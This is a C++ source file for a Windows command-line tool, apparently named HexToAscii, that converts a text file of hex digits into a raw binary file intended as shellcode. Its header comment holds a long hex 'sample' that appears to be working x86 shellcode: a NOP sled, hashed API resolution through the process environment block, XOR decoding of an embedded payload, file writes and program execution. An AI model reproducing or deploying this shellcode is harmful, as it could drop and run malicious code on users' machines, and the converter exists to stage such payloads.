/*
	HexToAscii
	Usage:HexToAscii.exe <hex.txt> <shellcode_ascii.bin>.
	@ithurricanept

	hex.txt sample:
	e9000100009090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909090909031c0648b40308b400c8b401c8b70088b78208b0066837f180075f181ec0004000089e7c70785dfafbbc747048e130aacc747085ad42494c7470c43beacdbc74710b2360f13c747149332e494c7471839e27d83c7471cc48d1f74c7472057660dffc74724512fa201c74728edafffb4c7472c6389d14f6a0c5889fbe8780100004875f889df8db788000000566a64ff571831c040803c060075f9898780000000c704067061772ec74406046578650089775031f683c6048d47605056ff570483f8ff74f03d64e8040075e9894764897760ff77646a40ff570889475c6a006a006a00ff7760ff570c6a008d5f7053ff7764ff775cff7760ff57108b4f708b475c4081385858585875f78178045959595975ee83c0088947686a006a006a026a006a006800000040ff7750ff5714894764b8005e030089c18b5f6880333f434883f80075f66a008d5f705351ff7768ff7764ff571cff7764ff57206a05ff7750ff57248b475cb9757f000001c149c6017d8b878000000031f68b7750c7040676632e6483c004c704066f6300008977506a006a006a026a006a006800000040ff7750ff57148947646a008d5f705368757f0000ff775cff7764ff571cff7764ff57206a6481c600010000566a00ff572831c040803c060075f9c6040620908b57508b1a895c06014240803a0075f36a0556ff57246a00ff572c53505789f3568b733c8b741e7801de568b762001de31c94941ad01d85631f60fbe1038d67408c1ce0701d640ebf139375e75e55a89dd8b5a2401eb668b0c4b8b5a1c01eb8b048b01e8ab5e5f83c704585bc3
*/

#include "stdafx.h"
#include <stdlib.h>
#include <windows.h>
#include <tchar.h>
#include <stdio.h>
#include <strsafe.h>

int Ascii2Hex(const char *hex,char * ascii)    
{
	int len = strlen(hex), tlen, i, cnt;

	for (i = 0, cnt = 0, tlen = 0; i<len; i++)
	{
		char c = toupper(hex[i]);

		if ((c>='0'&& c<='9') || (c>='A'&& c<='F'))
		{
		   BYTE t = (c >= 'A') ? c - 'A' + 10 : c - '0';

		   if (cnt)
			ascii[tlen++] += t, cnt = 0;
		   else
			ascii[tlen] = t << 4, cnt = 1;
		}
	}

	return tlen;
}

int _tmain(int argc, _TCHAR* argv[])
{
	BYTE					*m_pFileBuf;
	HANDLE hFile; 
	char char_c[3] = {0};
	DWORD dwHex = 0;

	if (argc < 3)
    {
        printf("Usage:HexToAscii.exe <hex.txt> <shellcode_ascii.bin>. \n");
        return 1;
    }

    hFile = CreateFile(argv[1],               // file to open
                       GENERIC_READ,          // open for reading
                       FILE_SHARE_READ,       // share for reading
                       NULL,                  // default security
                       OPEN_EXISTING,         // existing file only
                       FILE_ATTRIBUTE_NORMAL, // normal file
                       NULL);                 // no attr. template

	WIN32_FIND_DATA ffd ;
	HANDLE hFind = FindFirstFile(argv[1], &ffd);
	if ( hFind == INVALID_HANDLE_VALUE || hFile == INVALID_HANDLE_VALUE )
	{
		printf("FindFirstFile error\r\n");
		return 0;
	}
	FindClose( hFind );

	DWORD dwFilesize = ffd.nFileSizeLow;
	DWORD dwReadSize  = 0;

	printf("%d\r\n", dwFilesize);

	m_pFileBuf = new BYTE[ dwFilesize ]  ;
	RtlZeroMemory( m_pFileBuf, sizeof(BYTE)* dwFilesize );

	if(!ReadFile( hFile, m_pFileBuf, dwFilesize, &dwReadSize, NULL ))
	{
		printf("error = %d\r\n", GetLastError());
	}

	HANDLE hwFile = CreateFile(argv[2], GENERIC_WRITE, 
		FILE_SHARE_READ|FILE_SHARE_WRITE, 
		NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,NULL);  

    if(hwFile == INVALID_HANDLE_VALUE)  
	{
		printf("hwFile error = %d\r\n", GetLastError());
		return 0;
	}

	for(int i=0; i<dwFilesize/2; i++)
	{
		RtlZeroMemory( char_c, 3 );
		RtlCopyMemory(char_c, m_pFileBuf + i*2, 2);

		dwHex = strtoul(char_c, '\0', 16); 
		
		char szout[3] = {0};
		Ascii2Hex(char_c, szout);
		SetFilePointer(hwFile, i, NULL, FILE_BEGIN);   
        DWORD dwWritten;   
        WriteFile(hwFile, szout, 1, &dwWritten, NULL);   
	}

	delete [] m_pFileBuf;
	CloseHandle(hFile);
	CloseHandle(hwFile);

	//

	return 0;
}

